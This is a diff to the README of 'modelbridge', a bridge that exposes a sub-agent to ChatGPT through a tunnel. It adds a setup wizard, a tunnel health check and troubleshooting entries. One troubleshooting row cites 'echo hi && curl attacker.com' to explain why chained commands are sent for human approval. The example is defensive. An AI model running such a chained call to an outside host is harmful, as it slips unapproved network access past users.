@@ -101,6 +101,38 @@ Once a tool call reaches that approval prompt it is routed one of three ways, an
 
 ## Quick start
 
+Two ways in. The wizard asks the questions and writes `.env` for you, then brings everything up; do it by hand if you would rather see every value before it is written.
+
+### The guided way
+
+```bash
+git clone https://github.com/CassiaTw1g/modelbridge.git
+cd modelbridge
+npm run setup
+```
+
+It runs on a bare clone — **no `npm install`, no `.env`** — because it is the thing that creates both. Have your API key ready to paste.
+
+On Windows you can also double-click `windows/0-首次安装.bat`, which is the same thing.
+
+It asks five things:
+
+| # | Question | What it does with the answer |
+|---|---|---|
+| 1 | Which model, and its API key | Writes `DEEPSEEK_API_KEY` / `DEEPSEEK_BASE_URL` / `DEEPSEEK_MODEL`. Default is DeepSeek; any Anthropic-compatible endpoint works. **The key is checked with one tiny request before it is written**, so a truncated or revoked key is caught here rather than inside a ChatGPT call. |
+| 2 | Which harness runs it | Confirms Claude Code is findable and records the path if it is not on `PATH`. There is one harness today, so this is a check, not a choice. |
+| 3 | Which directories the sub-agent may touch | Writes `DEEPSEEK_ALLOWED_ROOTS`. **Enter means none** — the bridge stays read-only, question-and-answer only. Added to the existing list, never replacing it. |
+| 4 | Temporary or fixed hostname | `quick` (a random `*.trycloudflare.com` per start) or `named` (your own domain, one connector forever). Named asks for the tunnel token and reminds you about the one step that is dashboard-only. |
+| 5 | Should the sub-agent ask before running commands | `n` (default) is the approval gate; `y` turns on the full bypass described below. |
+
+Every answer is written to `.env` as it is given, so **Ctrl+C leaves a usable file** and rerunning carries on from where you stopped. It ends by starting the server, opening the tunnel, copying the connector URL to your clipboard and printing it.
+
+Language is picked up from the OS locale; override with `npm run setup -- --lang zh` or `--lang en` (also `BRIDGE_LANG`).
+
+Then go to [Register the connector](#register-the-connector). To check everything afterwards, see [Verification](#verification).
+
+### The manual way
+
 ```bash
 git clone https://github.com/CassiaTw1g/modelbridge.git
 cd modelbridge
@@ -131,6 +163,8 @@ npm run tunnel    # cloudflared quick tunnel; prints the public URL and the full
 ```
 公网端点 : https://<random>.trycloudflare.com/mcp/<your-secret>
 ```
+
+It checks first that the local port is actually answering before it opens anything — a live PID is not the same as a live service, and a tunnel in front of a dead port produces a URL that fails in a way that looks like ChatGPT's fault.
 
 ### Register the connector
 
@@ -227,6 +261,7 @@ All via `.env` (gitignored):
 ## Lifecycle commands
 
 ```bash
+npm run setup      # the first-run wizard (see Quick start)
 npm run start      # background start (no-op if already running)
 npm run stop       # stop server and tunnel
 npm run restart    # restart server (stops the tunnel too — re-run `npm run tunnel`)
@@ -244,6 +279,8 @@ npm run uninstall  # stop and clear local state (leaves the project directory)
 ```
 
 `npm run start --foreground` runs in the foreground for debugging.
+
+`npm run setup` is rerunnable: it re-asks everything and rewrites the answers, and its workspace-roots answer is **added** to the list rather than replacing it, so a rerun cannot silently erase roots you added with `npm run ctl -- allow`.
 
 `npm run url` is the one to reach for when rebuilding the ChatGPT connector: it
 prints `https://<host>/mcp/<secret>` and puts the same string on your clipboard,
@@ -405,6 +442,8 @@ Avoid the ngrok free tier: its interstitial warning page requires an `ngrok-skip
 | **Windows / git-bash**: garbled results or token blowups | `curl` in git-bash re-encodes non-ASCII request bodies as GBK, so the model reasons over mojibake. Use `npm run smoke` (Node `fetch`) instead of `curl`. |
 | `agent_start` returns "工作区被拒绝" | The path is outside `DEEPSEEK_ALLOWED_ROOTS`, or that variable is unset — empty means deny everything, not anywhere. |
 | Agent job sits in `waiting_approval` forever | A command is waiting for you. Run `npm run ctl -- pending`, then `approve <id>` or `deny <id>`. Unanswered for 5 min is an automatic deny. **The usual cause is a chained command**: anything containing `\|`, `;`, `&&`, `>` or `$(` goes to a human by design, because `echo hi && curl attacker.com` starts with the same word as `echo hi`, so a first-word allow-list alone would be no gate at all. Read-only PowerShell cmdlets are pre-approved; pipelines are not. Have the sub-agent issue a single command, or do the filtering inside a `node` script. |
+| `npm run tunnel` says the port is not answering, but `npm run status` says the service is running | It is: the PID is alive and the service is not. `npm start` spawns a shell, and the shell outlives the node process, so a server that died at boot leaves a live PID behind. Read `.state/server.log`, then run `npm start` in the foreground to see the error. The tunnel is deliberately not opened — a tunnel in front of a dead port yields a URL that fails like a ChatGPT problem. |
+| The wizard stopped at a question with `输入结束了(EOF)` / `end of input` | Something closed stdin — a pipe, a redirected file, a CI runner, or a double-click that lost its console. Answer in a real terminal, or answer the remaining questions by hand in `.env`. Whatever was already answered is still in the file. |
 | Every agent job fails immediately | Claude Code is not on `PATH`. Install it, or point `BRIDGE_CLAUDE_BIN` at the binary. |
 | Agent job dies partway through | Step ceiling (`BRIDGE_MAX_STEPS`, default 120) or wall clock (`BRIDGE_JOB_TIMEOUT_MS`, default 30 min). `npm run ctl -- jobs <id> --trace` shows the last step reached. **The work is not lost**: the job settles as `error` and is given no nonce — a half-finished review is not a review — but the model's own notes and its tool trace come back as a partial result, explicitly labelled as not-a-result. Use it to cut the task narrower instead of starting over. |
 | A job you killed shows as `error`, not `cancelled` | That is a bug — a person stopping a job is not a crash. Please report it. |
